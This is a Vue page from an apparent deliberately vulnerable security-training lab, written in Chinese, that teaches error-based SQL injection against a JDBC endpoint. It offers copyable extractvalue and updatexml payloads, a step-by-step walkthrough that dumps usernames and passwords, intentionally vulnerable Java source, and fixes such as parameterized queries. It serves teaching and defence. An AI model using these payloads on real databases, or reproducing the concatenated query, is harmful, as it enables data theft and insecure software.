<template>
  <vuln-template
    title="SQL注入 - 报错注入"
    subtitle="SQL Injection - Error Based (JDBC)"
    level="高危"
    :icon="DatabaseOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>报错注入 (Error Based SQL Injection)</strong> 是一种利用数据库错误信息来获取数据的SQL注入技术。
      </a-typography-paragraph>
      <a-typography-paragraph>
        报错注入的特点：
      </a-typography-paragraph>
      <ul>
        <li>利用数据库报错信息泄露数据</li>
        <li>不需要回显数据，只要有错误信息即可</li>
        <li>使用聚合函数、数学函数等触发错误</li>
        <li>常见于字符型注入场景</li>
        <li>可以快速获取数据库结构信息</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的报错注入payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>1' and extractvalue(1,concat(0x7e,database(),0x7e))#</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">使用extractvalue函数获取数据库名</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">使用updatexml函数获取当前用户</span>
      </a-space>

      <a-typography-paragraph code copyable style="margin-top: 12px">1' and (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))#</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">使用rand函数触发重复键错误</span>
      </a-space>

      <a-alert
        message="切勿在生产环境执行破坏性SQL语句！"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <!-- 模拟真实用户查询页面 -->
      <div style="background: #fff; padding: 24px; border-radius: 8px; margin-bottom: 24px;">
        <h3 style="margin-bottom: 16px; color: #1890ff;">👤 用户信息查询</h3>
        <a-form :model="formState" @finish="handleSubmit" layout="inline" style="width: 100%">
          <a-form-item
            name="id"
            :rules="[{ required: true, message: '请输入用户ID' }]"
            style="flex: 1; margin-right: 8px;"
          >
            <a-input
              v-model:value="formState.id"
              placeholder="请输入用户ID（如：1）"
              size="large"
              style="width: 100%;"
            />
          </a-form-item>
          <a-form-item>
            <a-button type="primary" html-type="submit" size="large" :loading="loading">
              <template #icon><search-outlined /></template>
              查询
            </a-button>
          </a-form-item>
        </a-form>
      </div>
      
      <!-- 显示查询结果 -->
      <div v-if="result" style="background: #f5f5f5; padding: 24px; border-radius: 8px;">
        <h4 style="margin-bottom: 16px;">📊 查询结果</h4>
        <div style="background: #fff; padding: 16px; border-radius: 4px;">
          <pre style="margin: 0; color: #1890ff; white-space: pre-wrap;">{{ result }}</pre>
        </div>
      </div>
    </template>

    <template #input-hint>
      <a-alert message="攻击示例流程" type="warning" show-icon style="margin-bottom: 12px;" />
      <p><strong>完整攻击流程：</strong></p>
      <ol style="padding-left: 20px; margin-bottom: 0; line-height: 2;">
        <li><strong>步骤1：</strong>测试注入点 - 输入 <a-typography-text code copyable>1'</a-typography-text>，查看是否有SQL语法错误</li>
        <li><strong>步骤2：</strong>获取数据库名 - 输入 <a-typography-text code copyable>1' and extractvalue(1,concat(0x7e,database(),0x7e))#</a-typography-text></li>
        <li><strong>步骤3：</strong>获取表名 - 输入 <a-typography-text code copyable>1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#</a-typography-text></li>
        <li><strong>步骤4：</strong>获取列名 - 输入 <a-typography-text code copyable>1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#</a-typography-text></li>
        <li><strong>步骤5：</strong>获取数据 - 输入 <a-typography-text code copyable>1' and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e))#</a-typography-text></li>
        <li><strong>步骤6：</strong>批量获取 - 使用limit子句逐条获取所有数据</li>
      </ol>
    </template>


    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/sqli/jdbc")
public class JDBC {
    @GetMapping("/error_based")
    public String error_based(String id) {
        StringBuilder result = new StringBuilder();
        try {
            Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);
            Statement stmt = conn.createStatement();
            // 漏洞：直接拼接用户输入，没有使用参数化查询
            String sql = "select * from users where id = '" + id + "'";
            result.append("执行SQL语句: ").append(sql).append("\\n");
            
            ResultSet rs = stmt.executeQuery(sql);
            // 处理结果...
        } catch (Exception e) {
            // 漏洞：返回完整的错误信息，包括SQL错误详情
            result.append("错误信息: ").append(e.getMessage()).append("\\n");
            result.append("错误类型: ").append(e.getClass().getName()).append("\\n");
            if (e.getCause() != null) {
                result.append("原因: ").append(e.getCause().getMessage()).append("\\n");
            }
        }
        return result.toString();
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：1. 直接拼接SQL语句，攻击者可以注入恶意SQL；2. 返回详细错误信息，攻击者可以通过报错注入获取数据库信息"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>使用参数化查询：</strong>使用PreparedStatement而不是Statement，参数使用?占位符</li>
        <li><strong>输入验证：</strong>对用户输入进行类型和格式验证，过滤特殊字符（单引号、分号等）</li>
        <li><strong>错误处理：</strong>不要在错误信息中暴露数据库细节，使用通用错误信息</li>
        <li><strong>最小权限原则：</strong>数据库账号使用最小权限，限制information_schema访问</li>
        <li><strong>ORM框架：</strong>使用MyBatis、Hibernate等ORM框架，使用参数绑定</li>
        <li><strong>WAF防护：</strong>部署Web应用防火墙过滤恶意SQL语句</li>
        <li><strong>SQL审计：</strong>记录所有SQL查询，便于发现异常</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        String sql = "SELECT * FROM users WHERE id = '" + id + "'";
        Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：使用PreparedStatement参数化查询
        String sql = "SELECT * FROM users WHERE id = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, id); // 参数会被自动转义，防止SQL注入
ResultSet rs = pstmt.executeQuery();</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：输入验证
        // 验证id是否为数字
        if (!id.matches("^[0-9]+$")) {
            throw new IllegalArgumentException("ID必须是数字");
        }
        int userId = Integer.parseInt(id);
        
        // 使用参数化查询
        String sql = "SELECT * FROM users WHERE id = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：安全的错误处理
        try {
            // 执行查询
            ResultSet rs = pstmt.executeQuery();
            // 处理结果...
        } catch (SQLException e) {
            // 记录详细错误到日志，但不返回给用户
            logger.error("数据库查询错误", e);
            // 返回通用错误信息，不暴露数据库细节
            throw new RuntimeException("查询失败，请稍后重试");
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：使用MyBatis参数绑定
        // Mapper接口
User getUserById(@Param("id") String id);</code></pre>
        </a-typography-paragraph>
      </div>
        
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode6" style="margin: 0;">
          <pre class="code-block"><code>// XML映射文件
        &lt;select id="getUserById" resultType="User"&gt;
            SELECT * FROM users WHERE id = #{id}
        &lt;/select&gt;
// #{id}会被自动转义，防止SQL注入</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { DatabaseOutlined, SearchOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/home/sqli/jdbc")
public class JDBC {
    @GetMapping("/error_based")
    public String error_based(String id) {
        StringBuilder result = new StringBuilder();
        try {
            Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);
            Statement stmt = conn.createStatement();
            // 漏洞：直接拼接用户输入，没有使用参数化查询
            String sql = "select * from users where id = '" + id + "'";
            result.append("执行SQL语句: ").append(sql).append("\\n");
            
            ResultSet rs = stmt.executeQuery(sql);
            // 处理结果...
        } catch (Exception e) {
            // 漏洞：返回完整的错误信息，包括SQL错误详情
            result.append("错误信息: ").append(e.getMessage()).append("\\n");
            result.append("错误类型: ").append(e.getClass().getName()).append("\\n");
            if (e.getCause() != null) {
                result.append("原因: ").append(e.getCause().getMessage()).append("\\n");
            }
        }
        return result.toString();
    }
}`

const fixCode1 = `// 错误示例(易受攻击)
String sql = "SELECT * FROM users WHERE id = '" + id + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);`

const fixCode2 = `// 正确示例1：使用PreparedStatement参数化查询
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, id); // 参数会被自动转义，防止SQL注入
ResultSet rs = pstmt.executeQuery();`

const fixCode3 = `// 正确示例2：输入验证
// 验证id是否为数字
if (!id.matches("^[0-9]+$")) {
    throw new IllegalArgumentException("ID必须是数字");
}
int userId = Integer.parseInt(id);

// 使用参数化查询
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();`

const fixCode4 = `// 正确示例3：安全的错误处理
try {
    // 执行查询
    ResultSet rs = pstmt.executeQuery();
    // 处理结果...
} catch (SQLException e) {
    // 记录详细错误到日志，但不返回给用户
    logger.error("数据库查询错误", e);
    // 返回通用错误信息，不暴露数据库细节
    throw new RuntimeException("查询失败，请稍后重试");
}`

const fixCode5 = `// 正确示例4：使用MyBatis参数绑定
// Mapper接口
User getUserById(@Param("id") String id);`

const fixCode6 = `// XML映射文件
<select id="getUserById" resultType="User">
    SELECT * FROM users WHERE id = #{id}
</select>
// #{id}会被自动转义，防止SQL注入`

const formState = reactive({
  id: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/sqli/jdbc/error_based', {
      params: formState
    })
    result.value = response.data
    message.success('查询完成')
  } catch (error) {
    message.error('查询失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.id = ''
  result.value = ''
}
</script>
